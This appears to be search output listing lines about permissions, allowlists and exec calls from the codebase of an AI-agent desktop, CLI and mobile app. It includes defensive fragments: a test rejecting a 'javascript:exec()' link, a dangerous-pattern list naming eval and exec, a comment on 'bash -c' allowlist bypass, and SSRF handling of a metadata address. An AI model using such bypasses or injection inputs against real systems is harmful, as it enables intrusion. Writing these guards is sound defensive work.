+apps/cli/src/tui/app/config.rs:309:                .set_approval_policy(self.config.permissions.approval_policy.value());
+apps/cli/src/tui/app/config.rs:314:                .set_sandbox_policy(self.config.permissions.sandbox_policy.get().clone())
+apps/cli/src/tui/status/card.rs:173:                config.permissions.approval_policy.value().to_string(),
+apps/cli/src/tui/status/card.rs:177:                summarize_sandbox_policy(config.permissions.sandbox_policy.get()),
+apps/cli/src/tui/status/card.rs:200:        let sandbox = match config.permissions.sandbox_policy.get() {
+apps/cli/src/tui/status/card.rs:216:        let permissions = if config.permissions.approval_policy.value() == AskForApproval::OnRequest
+apps/cli/src/tui/status/card.rs:217:            && *config.permissions.sandbox_policy.get()
+apps/cli/src/tui/status/card.rs:221:        } else if config.permissions.approval_policy.value() == AskForApproval::Never
+apps/cli/src/tui/status/card.rs:222:            && *config.permissions.sandbox_policy.get() == SandboxPolicy::DangerFullAccess
+apps/cli/src/tui/status/card.rs:506:        lines.push(formatter.line("Permissions", vec![Span::from(self.permissions.clone())]));
+apps/desktop/src-tauri/src/sys/account/mod.rs:408:/// - Domain must match the allowlist: `*.agiworkforce.com`, `localhost`, or `127.0.0.1`
+apps/desktop/src-tauri/src/sys/account/mod.rs:442:    // Domain allowlist: *.agiworkforce.com, localhost, 127.0.0.1
+apps/desktop/src-tauri/src/sys/account/mod.rs:447:            "API base URL host '{}' is not in the allowlist. \
+apps/desktop/src-tauri/src/sys/account/mod.rs:469:    // SSRF protection: validate against scheme and domain allowlist
+./crates/agiworkforce-command-registry/src/lib.rs:524:        assert_eq!(permissions.aliases, vec!["perms", "approvals"]);
+./crates/agiworkforce-command-registry/src/lib.rs:525:        assert_eq!(permissions.slash_aliases(), vec!["/perms", "/approvals"]);
+./crates/agiworkforce-protocol/src/exec_output.rs:84:// dedicated allowlist (like this one) plus unit tests that capture the actual shell output we want
+./crates/agiworkforce-protocol/src/exec_output.rs:139:/// encoding-specific byte allowlists like `WINDOWS_1252_PUNCT` and tests that exercise real-world
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:159:                    additional_permissions.as_ref(),
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:287:            ReviewDecision::Approved | ReviewDecision::ApprovedForSession => permissions.clone(),
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:298:            let message = if granted_permissions.is_empty() {
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:703:                } else if additional_permissions.is_some() {
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:762:    if let Some(file_system) = additional_permissions.file_system.as_ref() {
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:780:    if let Some(macos) = additional_permissions.macos.as_ref() {
+apps/cli/src/tui/bottom_pane/approval_overlay.rs:832:    format_additional_permissions_rule(&permissions.clone().into())
+./crates/agiworkforce-protocol/src/models.rs:1777:                sandbox_permissions.requires_escalated_permissions(),
+./crates/agiworkforce-protocol/src/models.rs:1781:                sandbox_permissions.requests_sandbox_override(),
+./crates/agiworkforce-protocol/src/models.rs:1785:                sandbox_permissions.uses_additional_permissions(),
+./crates/agiworkforce-protocol/src/approvals.rs:26:    /// Permissions to merge with the active turn permissions.
+./crates/agiworkforce-protocol/src/approvals.rs:28:    /// Fully resolved permissions that should replace the active turn permissions.
+./crates/agiworkforce-protocol/src/approvals.rs:275:                self.additional_permissions.as_ref(),
+./crates/agiworkforce-protocol/src/approvals.rs:301:        if additional_permissions.is_some() {
+./crates/agiworkforce-protocol/src/protocol.rs:705:        /// User-granted permissions.
+./packages/unified-chat/src/lib/connectorPermissionStore.ts:6: *     `~/.agiworkforce/connector-permissions.json`
+apps/desktop/src-tauri/src/lib.rs:773:            // Persisted to ~/Library/Application Support/.../app_permissions.json
+apps/desktop/src-tauri/src/lib.rs:777:                let perm_path = app_data_dir.join("app_permissions.json");
+apps/desktop/src-tauri/src/lib.rs:785:                                    "Failed to load app_permissions.json: {}",
+apps/desktop/src-tauri/src/features/messaging/signal.rs:13:/// Validate that a CLI path is a simple binary name on the allowlist,
+apps/desktop/src-tauri/src/features/messaging/signal.rs:31:    // Validate against allowlist
+apps/desktop/src-tauri/src/core/orchestration/workflow_executor.rs:772:                    ("child_process", "child process execution"),
+./apps/extension-vscode/src/services/checkpointManager.ts:20:import { execFile } from 'child_process';
+./apps/extension-vscode/src/services/checkpointManager.ts:338:          const match = /stash@\{(\d+)\}/.exec(line);
+./apps/extension-vscode/src/services/contextBuilder.ts:13:import { execFile } from 'child_process';
+./apps/extension-vscode/src/services/desktopBridge.ts:28: * Returns undefined if the file is missing or has unsafe permissions.
+./apps/extension-vscode/src/services/desktopBridge.ts:401:          // VSCODE-03: drop messages with unknown types (message-type allowlist).
+./apps/extension-vscode/src/providers/chatEditorPanel.ts:310:    while ((fileRefMatch = fileRefPattern.exec(text)) !== null) {
+./packages/providers/ollama/src/catalog.ts:19:  const match = /^(\d+(?:\.\d+)?)b$/i.exec(text.trim());
+./apps/extension-vscode/src/providers/inlineCompletionProvider.ts:69:  const fenced = /```(?:\w+)?\s*\n([\s\S]*?)```/.exec(trimmed);
+apps/desktop/src-tauri/src/features/teams/team_permissions.rs:53:        permissions.iter().all(|p| Self::has_permission(member, *p))
+apps/desktop/src-tauri/src/features/teams/team_permissions.rs:57:        permissions.iter().any(|p| Self::has_permission(member, *p))
+./apps/extension-vscode/src/providers/agentMode/agentLoop.ts:45:  while ((match = editPattern.exec(response)) !== null) {
+./apps/extension-vscode/src/providers/agentMode/agentLoop.ts:65:  while ((match = readPattern.exec(response)) !== null) {
+apps/desktop/src-tauri/src/sys/commands/agi.rs:67:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+apps/desktop/src-tauri/src/sys/commands/agi.rs:74:        "Automation service not available. Please grant accessibility permissions.".to_string()
+apps/desktop/src-tauri/src/sys/commands/agi.rs:293:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+apps/desktop/src-tauri/src/sys/commands/agi.rs:300:        "Automation service not available. Please grant accessibility permissions.".to_string()
+apps/desktop/src-tauri/src/sys/commands/voice.rs:2134:        return Err("No audio data was captured. Check microphone permissions.".to_string());
+./apps/extension-vscode/src/providers/sidebar/ChatStateManager.ts:442:    while ((fileRefMatch = fileRefPattern.exec(text)) !== null) {
+./packages/unified-chat/src/components/MessageBubble.tsx:26: * Validate a markdown link URL against an allowlist of safe schemes.
+./packages/unified-chat/src/components/MessageBubble.tsx:197:        const orderedMatch = /^\s{0,10}\d+[.)]\s(.+)$/.exec(line);
+./packages/unified-chat/src/components/MessageBubble.tsx:199:        const unorderedMatch = /^\s{0,10}[-*]\s(.+)$/.exec(line);
+./packages/unified-chat/src/components/MessageBubble.tsx:231:            const hashMatch = /^(#{1,6})\s(.+)$/.exec(line);
+./packages/unified-chat/src/components/MessageBubble.tsx:295:  while ((match = regex.exec(text)) !== null) {
+./apps/desktop/src/handlers/commands/system.ts:391:    const slackMatch = /^slack\s+(#[\w-]+)\s+(.+)$/i.exec(trimmed);
+./apps/desktop/src/handlers/commands/system.ts:392:    const emailMatch = /^email\s+([\w.+-]+@[\w.-]+\.\w+)\s+(.+)$/i.exec(trimmed);
+apps/desktop/src-tauri/src/core/mcp/server/tools.rs:90:    fn enabled_tool_check_respects_allowlist() {
+apps/desktop/src-tauri/src/core/mcp/server/tools.rs:91:        let allowlist = vec!["agi_chat".to_string(), "agi_bash".to_string()];
+apps/desktop/src-tauri/src/core/mcp/server/tools.rs:94:            &allowlist, "agi_chat"
+apps/desktop/src-tauri/src/core/mcp/server/tools.rs:97:            &allowlist,
+apps/desktop/src-tauri/src/sys/commands/email.rs:1219:    fn test_secure_password_storage_and_retrieval() {
+./apps/mobile/services/billing.ts:6: * before being opened (HIGH-MOB-02 allowlist in lib/safeOpenURL.ts).
+apps/desktop/src-tauri/src/sys/commands/project_context.rs:153:                "Cannot access the folder '{}'. Please check permissions.",
+apps/desktop/src-tauri/src/core/mcp/transport.rs:399:        // Validate the command against the allowlist before spawning
+apps/desktop/src-tauri/src/core/mcp/transport.rs:433:        // We use a blocklist (not allowlist) because MCP servers legitimately need most of
+apps/desktop/src-tauri/src/core/mcp/transport.rs:434:        // the parent environment (PATH, HOME, LANG, etc.) to function. An allowlist would
+./packages/unified-chat/src/components/__tests__/MessageBubble.test.tsx:41:    expect(safeHref('\tjavascript:exec()')).toBeNull();
+apps/desktop/src-tauri/src/sys/commands/agent.rs:48:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+./apps/mobile/services/mcp.ts:5: * cannot run `@modelcontextprotocol/sdk` directly (no `child_process`, no
+apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:23:/// - **Plan**: Read-only tools allowed (same allowlist as Safe). The agent
+apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:157:    /// Read-only tool allowlist shared by Safe and Plan modes.
+apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:194:                // Direct allowlist match
+./apps/mobile/services/notifications.ts:263:// Route allowlist — only navigate to known safe app routes
+./apps/extension-vscode/src/services/telemetry.ts:67:// ─── Telemetry endpoint allowlist ────────────────────────────────────────────
+./apps/extension-vscode/src/services/telemetry.ts:184:  // Security: validate the endpoint against the domain allowlist to prevent data exfiltration
+./apps/extension-vscode/src/services/patchEngine.ts:102:  while ((envelopeMatch = envelopePattern.exec(text)) !== null) {
+./apps/extension-vscode/src/services/patchEngine.ts:112:    while ((hunkMatch = hunkPattern.exec(body)) !== null) {
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:58:    // Note: bash, sh, zsh intentionally excluded from ShellCommand allowlist.
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:59:    // Shell interpreters bypass the allowlist via -c flag (e.g., bash -c "nmap ...").
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:805:/// 2. Command allowlist enforcement (base command must be in ALLOWED_SHELL_COMMANDS)
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:854:    // --- Layer 1: Command allowlist enforcement ---
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:1209:            // SECURITY: Validate command against dangerous patterns, allowlist, and injection
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:1477:            // SECURITY: Validate script against dangerous patterns, allowlist, and injection
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2066:        // rm is not in the allowlist, so it gets caught at the allowlist layer
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2068:        // cp IS in the allowlist, so test patterns that hit the protected-path layer
+apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2143:        // /usr/bin/git should be allowed (base command "git" is in allowlist)
+packages/unified-chat/src/lib/connectorPermissionStore.ts:6: *     `~/.agiworkforce/connector-permissions.json`
+apps/desktop/src-tauri/src/features/tests/agi_tests.rs:494:    fn test_memory_retrieval() {
+./apps/mobile/lib/markdown.ts:59:  while ((match = codeBlockRegex.exec(text)) !== null) {
+./apps/mobile/lib/markdown.ts:86:  while ((match = inlineRegex.exec(text)) !== null) {
+./apps/mobile/lib/safeOpenURL.ts:22: * enforces a strict allowlist:
+./apps/mobile/lib/safeOpenURL.ts:32: * The same allowlist that's used here is mirrored on the OAuth flow in
+./apps/mobile/lib/safeOpenURL.ts:63:      console.warn('[safeOpenURL] Refusing to open URL outside allowlist:', input);
+apps/desktop/src-tauri/src/sys/commands/mcpb.rs:1436:                    description: "Cloudflare API token with appropriate permissions.".to_string(),
+apps/desktop/src-tauri/src/sys/commands/computer_use.rs:907:        Ok(dir) => dir.join("app_permissions.json"),
+apps/desktop/src-tauri/src/sys/commands/computer_use.rs:909:            tracing::warn!("Could not resolve app_data_dir for app_permissions.json: {}", e);
+apps/desktop/src-tauri/src/sys/commands/computer_use.rs:917:                tracing::warn!("Failed to persist app_permissions.json at {:?}: {}", path, e);
+./apps/extension-vscode/src/__tests__/bridgeAllowlists.test.ts:4: * Locks the inbound-message-type and inbound-command allowlists. These are
+apps/desktop/src-tauri/src/sys/commands/connector_permissions.rs:3://! Permissions are stored in `~/.agiworkforce/connector-permissions.json` encrypted
+apps/desktop/src-tauri/src/sys/commands/connector_permissions.rs:78:        .map(|d| d.join("connector-permissions.json"))
+apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:83:                                data: json!({ "error": format!("Automation service not available: {}. Please grant accessibility permissions.", e), "success": false }),
+apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:84:                                error: Some(format!("Automation service not available: {}. Please grant accessibility permissions.", e)),
+apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:220:                                data: json!({ "error": format!("Automation service not available: {}. Please grant accessibility permissions.", e), "success": false }),
+apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:221:                                error: Some(format!("Automation service not available: {}. Please grant accessibility permissions.", e)),
+apps/desktop/src-tauri/src/core/llm/tool_executor/mod.rs:1069:                        "mcp__filesystem__read_text_file timed out after {}ms. Try a smaller file or verify permissions.",
+apps/desktop/src-tauri/src/core/llm/tool_executor/browser_tools.rs:114:    //    Check before pseudo-class allowlist walk so the error message is specific.
+apps/desktop/src-tauri/src/core/llm/tool_executor/browser_tools.rs:119:    // 5. Validate pseudo-classes against the safe allowlist.
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:52:        // SECURITY: Block CTE (WITH) queries — they can bypass table allowlist validation
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:112:        // SECURITY: Table allowlist — LLM may only SELECT from non-sensitive tables.
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:167:        // Extract FROM and JOIN table references and validate each against the allowlist.
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:380:        // Block dangerous DDL operations and CTEs (which can bypass table allowlist)
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:405:        // SECURITY: Table allowlist for write operations — very narrow set.
+apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:461:            // Re-use the same ALLOWED_QUERY_TABLES allowlist from execute_db_query_tool.
+./apps/extension-vscode/src/__tests__/inlineCompletionProvider.test.ts:17:  const fenced = /```(?:\w+)?\s*\n([\s\S]*?)```/.exec(trimmed);
+apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:3://! Verifies the application has required file system permissions.
+apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:139:                "Check directory permissions. On macOS/Linux, use chmod. On Windows, check folder security properties.",
+apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:153:                "Some optional directories have limited permissions.",
+./apps/mobile/__tests__/safe-open-url.test.ts:16: * screens now route through. These tests pin the allowlist contract.
+./apps/mobile/__tests__/safe-open-url.test.ts:95:  it('opens the URL when allowlisted and returns true', async () => {
+apps/desktop/src-tauri/src/sys/permissions/manager.rs:280:        let db_path = dir.path().join("permissions.db");
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:116:        for blocked in &self.file_permissions.blocked_paths {
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:122:        if !self.file_permissions.allowed_paths.is_empty() {
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:134:        if self.file_permissions.allowed_extensions.is_empty() {
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:152:        if !self.network_permissions.allowed_domains.is_empty() {
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:222:        policy.file_permissions.allowed_paths = vec!["C:\\Users\\".to_string()];
+apps/desktop/src-tauri/src/sys/permissions/policy.rs:223:        policy.file_permissions.blocked_paths = vec!["C:\\Windows\\".to_string()];
+./apps/extension-vscode/src/__tests__/applyEdit.test.ts:10:  const langMatch = langPattern.exec(text);
+./apps/extension-vscode/src/__tests__/applyEdit.test.ts:16:  const anyMatch = anyPattern.exec(text);
+./apps/desktop/e2e/utils/test-database.ts:46:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:55:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:70:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:78:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:99:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:115:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:130:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:143:      this.db.exec(`
+./apps/desktop/e2e/utils/test-database.ts:335:      this.db.exec(`
+./apps/extension-vscode/src/__tests__/security.test.ts:46:  it('REJECTS http endpoint pointing at non-allowlisted host', () => {
+./packages/unified-chat/src/components/CitationPill.tsx:16:    window.open(citation.url, '_blank', 'noopener,noreferrer');
+./packages/unified-chat/src/components/UserProfile.tsx:351:                window.open('https://agiworkforce.com/help', '_blank');
+./packages/unified-chat/src/components/UserProfile.tsx:372:                window.open('https://agiworkforce.com/download', '_blank');
+apps/desktop/src-tauri/src/sys/commands/realtime.rs:150:    // Persist with restricted permissions.
+./apps/extension-vscode/src/utils/api.ts:194: * - Host must be in the allowlist OR be localhost/127.0.0.1
+./apps/extension-vscode/src/utils/api.ts:240: * URL is additionally validated against the host allowlist.
+./apps/extension-vscode/src/utils/applyEdit.ts:19:  const langMatch = langPattern.exec(text);
+./apps/extension-vscode/src/utils/applyEdit.ts:26:  const anyMatch = anyPattern.exec(text);
+apps/desktop/src-tauri/src/sys/security/api.rs:59:        self.permissions.contains(&permission.to_string())
+apps/desktop/src-tauri/src/sys/security/api.rs:60:            || self.permissions.contains(&"*".to_string())
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:120:            permissions: permissions.unwrap_or_else(|| config.default_permissions.clone()),
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:208:        for blocked in &session.permissions.blocked_paths {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:215:        if session.permissions.allowed_paths.is_empty() {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:220:        for allowed in &session.permissions.allowed_paths {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:245:        if !session.permissions.network_access {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:250:        for blocked in &session.permissions.blocked_hosts {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:257:        if session.permissions.allowed_hosts.is_empty() {
+apps/desktop/src-tauri/src/sys/security/sandbox.rs:262:        for allowed in &session.permissions.allowed_hosts {
+apps/desktop/src-tauri/src/sys/security/permissions.rs:340:        assert_eq!(permissions.len(), 2);
+apps/desktop/src-tauri/src/core/agent/runtime.rs:435:            "Permission denied. Check file/directory permissions. Ensure the process has read/write access. On Windows, try running with administrator privileges if needed."
+apps/desktop/src-tauri/src/sys/security/tool_guard.rs:1809:            "eval(",
+apps/desktop/src-tauri/src/sys/security/tool_guard.rs:1810:            "exec(",
+apps/desktop/src-tauri/src/sys/security/machine_key.rs:68:    /// `~/.agiworkforce/connector-permissions.json` (Desktop P0, audit C-rank 1).
+apps/desktop/src-tauri/src/sys/security/auth.rs:741:    fn test_jwt_secret_retrieval() {
+apps/desktop/src-tauri/src/sys/security/rbac.rs:127:            permissions.extend(role_perms.iter().cloned());
+apps/desktop/src-tauri/src/sys/security/rbac.rs:143:                permissions.insert(perm_name);
+apps/desktop/src-tauri/src/sys/security/rbac.rs:145:                permissions.remove(&perm_name);
+apps/desktop/src-tauri/src/sys/security/rbac.rs:149:        Ok(permissions.into_iter().collect())
+apps/desktop/src-tauri/src/sys/security/rbac.rs:373:        assert!(!permissions.is_empty());
+apps/desktop/src-tauri/src/sys/security/rbac.rs:375:        assert!(permissions.iter().any(|p| p.name == "chat:read"));
+apps/desktop/src-tauri/src/sys/security/rbac.rs:376:        assert!(permissions.iter().any(|p| p.name == "chat:write"));
+packages/unified-chat/src/components/MessageBubble.tsx:26: * Validate a markdown link URL against an allowlist of safe schemes.
+packages/unified-chat/src/components/MessageBubble.tsx:197:        const orderedMatch = /^\s{0,10}\d+[.)]\s(.+)$/.exec(line);
+packages/unified-chat/src/components/MessageBubble.tsx:199:        const unorderedMatch = /^\s{0,10}[-*]\s(.+)$/.exec(line);
+packages/unified-chat/src/components/MessageBubble.tsx:231:            const hashMatch = /^(#{1,6})\s(.+)$/.exec(line);
+packages/unified-chat/src/components/MessageBubble.tsx:295:  while ((match = regex.exec(text)) !== null) {
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:3://! Persists config and allowlisted senders to a JSON file in the app data
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:44:/// An allowlisted sender
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:69:    allowlist: HashMap<String, AllowlistedSender>,
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:78:    allowlist: Arc<RwLock<HashMap<String, AllowlistedSender>>>,
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:90:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:103:        let (config, allowlist) = storage_path
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:109:                        .map(|state| (state.config, state.allowlist))
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:117:            allowlist: Arc::new(RwLock::new(allowlist)),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:132:    /// Persist the current config and allowlist to disk.
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:147:        let allowlist = match self.allowlist.read() {
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:152:        let state = PersistedDmState { config, allowlist };
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:217:    /// Verify a pairing code and add the sender to the allowlist on success.
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:228:                // Add to allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:237:                let mut allowlist = self
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:238:                    .allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:241:                allowlist.insert(requester_id.to_string(), sender);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:246:                // Persist the updated allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:248:                drop(allowlist);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:258:    /// Check if a sender is allowlisted
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:269:        let allowlist = self
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:270:            .allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:274:        Ok(allowlist.contains_key(sender_id))
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:277:    /// Manually add to allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:278:    pub fn add_to_allowlist(
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:292:        let mut allowlist = self
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:293:            .allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:296:        allowlist.insert(sender_id.to_string(), sender);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:297:        drop(allowlist);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:304:    /// Remove from allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:305:    pub fn remove_from_allowlist(&self, sender_id: &str) -> Result<bool> {
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:306:        let mut allowlist = self
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:307:            .allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:310:        let removed = allowlist.remove(sender_id).is_some();
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:311:        drop(allowlist);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:320:    /// List allowlisted senders
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:321:    pub fn list_allowlist(&self) -> Result<Vec<AllowlistedSender>> {
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:322:        let allowlist = self
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:323:            .allowlist
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:326:        Ok(allowlist.values().cloned().collect())
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:379:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:384:        dm.add_to_allowlist("user-1", "discord", Some("Alice"))
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:385:            .expect("add_to_allowlist should succeed");
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:398:        assert_eq!(state.allowlist.len(), 1);
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:399:        assert!(state.allowlist.contains_key("user-1"));
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:401:            state.allowlist["user-1"].display_name.as_deref(),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:420:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:424:        dm.add_to_allowlist("user-2", "slack", None)
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:426:        dm.remove_from_allowlist("user-2")
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:431:        assert!(state.allowlist.is_empty());
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:447:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:476:        dm.add_to_allowlist("test", "test", None)
+apps/desktop/src-tauri/src/sys/security/dm_protection.rs:478:        let list = dm.list_allowlist().expect("list should work");
+packages/unified-chat/src/components/__tests__/MessageBubble.test.tsx:41:    expect(safeHref('\tjavascript:exec()')).toBeNull();
+./apps/desktop/src-tauri/src/data/database/query_builder.rs:64:/// Returns `Err` if the table is not in the allowlist, blocking execution.
+./apps/desktop/src-tauri/src/data/database/mysql_client.rs:199:            .exec(sql, mysql_params)
+./apps/desktop/src-tauri/src/data/database/mysql_client.rs:439:            .exec(&call_sql, mysql_params)
+packages/unified-chat/src/components/CitationPill.tsx:16:    window.open(citation.url, '_blank', 'noopener,noreferrer');
+apps/desktop/src-tauri/src/integrations/realtime/websocket_server.rs:2026:    // ── B3 fix: Origin allowlist tests ──────────────────────────────────────
+packages/unified-chat/src/components/UserProfile.tsx:351:                window.open('https://agiworkforce.com/help', '_blank');
+packages/unified-chat/src/components/UserProfile.tsx:372:                window.open('https://agiworkforce.com/download', '_blank');
+./apps/mobile/components/chat/MessageContentRenderer.tsx:22:  while ((match = mathRegex.exec(text)) !== null) {
+./apps/mobile/components/chat/MessageContentRenderer.tsx:61:  while ((inlineMatch = inlineRegex.exec(text)) !== null) {
+./apps/mobile/components/chat/MessageContentRenderer.tsx:359:  while ((match = blockRegex.exec(content)) !== null) {
+./apps/desktop/src-tauri/src/automation/uia/tests.rs:425:    fn test_element_registration_and_retrieval() {
+./apps/desktop/src-tauri/src/automation/computer_use/safety.rs:379:        self.app_permissions.is_some()
+./apps/desktop/scripts/vite-plugin-ipc-check.ts:105:      while ((match = INVOKE_LITERAL_RE.exec(line)) !== null) {
+./apps/desktop/scripts/vite-plugin-ipc-check.ts:129:          const m = PUB_FN_RE.exec(next);
+./apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:738:        // `self.app_permissions.decide(app_name, Some(bundle_id)).await`
+./apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:747:        let denied = self.app_permissions.denied_apps().await;
+./apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:750:                "App '{}' is blocked by your automation permissions.",
+./apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:756:        let all_perms = self.app_permissions.list_permissions().await;
+./apps/mobile/components/chat/PaywallBottomSheet.tsx:123:      // openExternalUrl enforces the allowlist: agiworkforce.com / stripe.com only.
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:14:/// regardless of user-configured permissions. Mirrors Claude Cowork's
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:170:    /// Creates a new manager with no permissions.
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:177:    /// Creates a manager pre-loaded with permissions.
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:190:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:214:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:230:        let mut perms = self.permissions.write().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:254:        let mut perms = self.permissions.write().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:276:        let mut perms = self.permissions.write().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:282:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:288:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:298:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:306:    /// Clears all permissions.
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:308:        let mut perms = self.permissions.write().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:314:        let perms = self.permissions.read().await;
+./apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:322:        let mut perms = self.permissions.write().await;
+./apps/desktop/src-tauri/src/features/messaging/signal.rs:13:/// Validate that a CLI path is a simple binary name on the allowlist,
+./apps/desktop/src-tauri/src/features/messaging/signal.rs:31:    // Validate against allowlist
+./apps/web/lib/egress-policy.ts:2: * Egress policy: validates outbound URLs against a hardened allowlist.
+./apps/web/lib/egress-policy.ts:5: * WEB-NEW-009 hardening (2026-05-04 audit): the original allowlist correctly
+./apps/web/lib/egress-policy.ts:6: * rejected `https://169.254.169.254/...` (no allowlist hit) but offered no
